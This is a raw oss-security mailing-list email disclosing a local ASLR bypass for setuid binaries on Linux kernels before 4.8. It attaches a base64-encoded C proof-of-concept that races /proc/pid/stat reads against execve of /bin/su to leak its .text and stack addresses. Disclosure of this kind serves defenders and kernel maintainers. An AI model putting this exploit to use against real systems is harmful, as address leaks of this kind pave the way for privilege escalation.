X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["4759" "Wednesday" "3" "April" "2019" "16:15:21" "+0100" "Federico Manuel Bento" "up201407890@fc.up.pt" "<d7f72dad06e6d0b63f8418529f265784@fc.up.pt>" "93" "[oss-security] Linux kernel < 4.8 local generic ASLR bypass for setuid binaries" "^Date:" nil nil "4" "2019040315:15:21" "[oss-security] Linux kernel < 4.8 local generic ASLR bypass for setuid binaries" (number mark "        up201407890@ Apr  3   93/4759  " thread-indent "\"[oss-security] Linux kernel < 4.8 local generic ASLR bypass for setuid binaries\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Linux kernel < 4.8 local generic ASLR bypass for setuid binaries" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 28578 invoked by uid 550); 3 Apr 2019 16:26:14 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 9377 invoked from network); 3 Apr 2019 15:15:37 -0000
X-Virus-Scanned: amavisd-new at smtp-out1.fc.up.pt
MIME-Version: 1.0
Content-Type: multipart/mixed;
 boundary="=_f51f39b8bc6f9125bc0c1d2b2a986c9f"
Content-Transfer-Encoding: 7bit
User-Agent: Roundcube Webmail/FCUP
Message-ID: <d7f72dad06e6d0b63f8418529f265784@fc.up.pt>
X-Sender: up201407890@fc.up.pt
Organization: FCUP
Date: Wed, 03 Apr 2019 16:15:21 +0100
From: Federico Manuel Bento <up201407890@fc.up.pt>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] Linux kernel < 4.8 local generic ASLR bypass for setuid binaries
To: oss-security@lists.openwall.com

--=_f51f39b8bc6f9125bc0c1d2b2a986c9f
Content-Transfer-Encoding: 7bit
Content-Type: text/plain; charset=UTF-8;
 format=flowed

Hi list,

As far as I know, commit 9f834ec18defc369d73ccf9e87a2790bfa05bf46 wasn't 
backported to earlier kernels, which fixed a vulnerability (unknown at 
the time?) that allows local attackers to derandomize the base address 
of .text and stack generically for all setuid binaries. My guess is that 
such change was done as a later response to one of Jann Horn's reports 
(https://bugs.chromium.org/p/project-zero/issues/detail?id=807) that was 
fixed in commit 79c9ce57eb2d5f1497546a3946b4ae21b6fdc438. In any case, 
the vulnerable code is still present in other binary formats (if they're 
still relevant), e.g., in fs/binfmt_aout.c (and others).

If my assumptions are incorrect, please let me know :)

I've also attached a PoC exploit code.

Thanks,
Federico.
--=_f51f39b8bc6f9125bc0c1d2b2a986c9f
Content-Transfer-Encoding: base64
Content-Type: text/x-c;
 name=aslrip.c
Content-Disposition: attachment;
 filename=aslrip.c;
 size=2694

LyoKICogRmVkZXJpY28gQmVudG8gKEB1aWQxMDAwKQogKgogKiBBU0xSSVAK
ICoKICogVGhpcyBzaG91bGQgd29yayBvbiBMaW51eCBrZXJuZWxzIDwgNC44
CiAqCiAqIFdhcyBmaXhlZCBvbiBjb21taXQgOWY4MzRlYzE4ZGVmYzM2OWQ3
M2NjZjllODdhMjc5MGJmYTA1YmY0NiwKICogYnV0IHNlZW1zIGxpa2UgaXQg
d2Fzbid0IGJhY2twb3J0ZWQgdG8gb2xkZXIga2VybmVscywgc2FkIHNhZC4K
ICoKICogaW5zdGFsbF9leGVjX2NyZWRzKCkgaXMgY2FsbGVkIHRvbyBsYXRl
IGluIGxvYWRfZWxmX2JpbmFyeSgpCiAqIHdoaWNoIG1lYW5zIHRoYXQgYW4g
ZXhlY3V0YWJsZSBpcyBtbWFwZWQgaW50byBpdHMgYWRkcmVzcyBzcGFjZSAK
ICogYmVmb3JlIGl0cyBjcmVkZW50aWFscyBhcmUgc2V0LiBUaGlzIGlzIGEg
cHJvYmxlbSBmb3Igc2V0dWlkIAogKiBiaW5hcmllcyBiZWNhdXNlIHdlIGFy
ZSB0aGVuIGFibGUgdG8gbGVhayBzb21lIGFkZHJlc3NlcyBzaW5jZSAKICog
d2UgcGFzcyB0aGUgcHRyYWNlX21heV9hY2Nlc3MoKSBjaGVjayBpZiB3ZSBy
ZWFkKCkgCiAqIC9wcm9jL3BpZC9zdGF0IGJlZm9yZSBpbnN0YWxsX2V4ZWNf
Y3JlZHMoKSBpcyBjYWxsZWQuIAogKiBUaGlzIGJ5cGFzc2VzIEFTTFIuICBX
ZSBjYW4gd2luIHRoaXMgcmFjZSBlYXNpbHkgCiAqIGJ5IHVzaW5nIHJlYWQo
KSBvbiBhIGxvb3AgYmVmb3JlIHRoZSBzZXR1aWQgZXhlY3ZlIGFuZCAKICog
KmltbWVkaWF0ZWx5KiBhZnRlci4KICogCiAqIFVzaW5nIC9iaW4vc3UgYXMg
YW4gZXhhbXBsZSwgc2hvdWxkIGFsc28gd29yayBvbiBvdGhlcgogKiBzZXR1
aWQgYmluYXJpZXMuCiAqCiAqICQgLi9hc2xyaXAgCiAqICoqKioqIEFTTFJJ
UCAqKioqKgogKiBbK10gTGVha2luZyAvYmluL3N1CiAqIFsrXSAvYmluL3N1
IC50ZXh0IGlzIGF0OiAweDU1ZDRiY2EyZjAwMAogKiBbK10gL2Jpbi9zdSBz
dGFjayBpcyBhdDogMHg3ZmZmM2VhNzIwMDMKICogUGFzc3dvcmQ6IAogKiBz
dTogQXV0aGVudGljYXRpb24gZmFpbHVyZQogKgogKi8KCiNpbmNsdWRlIDxz
eXMvdHlwZXMuaD4KI2luY2x1ZGUgPHN5cy9zdGF0Lmg+CiNpbmNsdWRlIDxm
Y250bC5oPgojaW5jbHVkZSA8c3RkaW8uaD4KI2luY2x1ZGUgPHVuaXN0ZC5o
PgojaW5jbHVkZSA8c3RkbGliLmg+CiNpbmNsdWRlIDxzdHJpbmcuaD4KCnZv
aWQgd2FpdF9hbmRfcGFyc2UoaW50IGZkKQp7CglpbnQgaSwgZm91bmRfdGV4
dCwgY291bnQgPSAxOwoJY2hhciBidWZbNDA5Nl0sICp0b2s7Cglmb3IoaSA9
IDA7IGkgPCA1MDAwMDA7IGkrKykgewogICAgICAgIAlyZWFkKGZkLCBidWYs
IHNpemVvZihidWYpKTsKICAgICAgICAgICAgICAgIC8vcHJpbnRmKCIlc1xu
IiwgYnVmKTsKICAgICAgICAgICAgICAgIGlmKHN0cnN0cihidWYsICIoc3Up
IikpIHsKICAgICAgICAgICAgICAgIAl0b2sgPSBzdHJ0b2soYnVmLCAiICIp
OwogICAgICAgICAgICAgICAgICAgICAgICB3aGlsZSh0b2sgIT0gTlVMTCkg
ewogICAgICAgICAgICAgICAgICAgICAgICAJaWYoY291bnQgPT0gNDcgJiYg
c3RydG91bCh0b2ssIE5VTEwsIDEwKSkgewogICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgIAlwcmludGYoIlsrXSAvYmluL3N1IC50ZXh0IGlzIGF0
OiAweCVseFxuIiwgc3RydG91bCh0b2ssIE5VTEwsIDEwKSAtIDB4MjBlMDAw
KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAJZm91bmRfdGV4
dCA9IDE7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlIGlmKGZvdW5kX3Rl
eHQgPT0gMSAmJiBjb3VudCA9PSA0OCAmJiBzdHJ0b3VsKHRvaywgTlVMTCwg
MTApKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICBwcmludGYoIlsrXSAvYmluL3N1IHN0YWNrIGlzIGF0OiAweCVseFxuIiwg
c3RydG91bCh0b2ssIE5VTEwsIDEwKSAtIDB4MjBjMTApOwogICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xvc2UoZmQpOwogICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhpdCgwKTsK
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAg
ICAgICAgICAgICAgIAljb3VudCsrOwogICAgICAgICAgICAgICAgICAgICAg
ICAJdG9rID0gc3RydG9rKE5VTEwsICIgIik7CiAgICAgICAgICAgICAgICAg
ICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNv
dW50ID0gMTsKICAgICAgICAgICAgICAgIGxzZWVrKGZkLCAwLCBTRUVLX1NF
VCk7Cgl9Cn0KCmludCBtYWluKCkKewoJaW50IHBpZCwgZmQ7CgljaGFyIGJ1
ZlsyMF07CgkKCXBpZCA9IGZvcmsoKTsKCglpZihwaWQgPT0gMCkgewoJCXBy
aW50ZigiKioqKiogQVNMUklQICoqKioqXG4iKTsKCQlwcmludGYoIlsrXSBM
ZWFraW5nIC9iaW4vc3VcbiIpOwoKCQlzbnByaW50ZihidWYsIHNpemVvZihi
dWYpIC0gMSwgIi9wcm9jLyVkL3N0YXQiLCBnZXRwcGlkKCkpOwoJCQoJCWZk
ID0gb3BlbihidWYsIE9fUkRPTkxZKTsKCgkJaWYoZmQgPT0gLTEpIHsKCQkJ
cHJpbnRmKCJvcGVuKCkgZmFpbGVkXG4iKTsKCQkJZXhpdCgxKTsKCQl9CgoJ
CXdhaXRfYW5kX3BhcnNlKGZkKTsKCX0KCQoJZWxzZSB7CgkJc2xlZXAoMSk7
CgkJZXhlY2xwKCIvYmluL3N1IiwgInN1IiwgTlVMTCk7Cgl9Cn0K

--=_f51f39b8bc6f9125bc0c1d2b2a986c9f--
